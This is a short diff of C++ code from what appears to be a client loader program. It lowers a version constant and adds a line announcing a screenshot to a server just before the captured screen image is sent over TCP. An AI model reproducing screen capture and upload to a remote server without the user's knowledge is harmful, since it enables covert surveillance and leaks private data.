@@ -31,7 +31,7 @@ Organise everything into methods
 bool LoggedIn = false;
 std::string LoginText;
 extern ByteArray screenshot;
-double LoaderVer = 1.2;
+double LoaderVer = 1.1;
 std::string Version = std::to_string(LoaderVer);
 std::string Versionstr;
 #define BUFFER 8192
@@ -244,7 +244,7 @@ void main(int argc, char** argv)
 
 
 		}
-		
+		TCPClient->SendText(LIT("SendingMuchNeededInformation")); // tell the server that we are sending a screenshot so it can call getfile
 		File file;
 		file.TCPClient = TCPClient;
 		file.Array = screenshot;
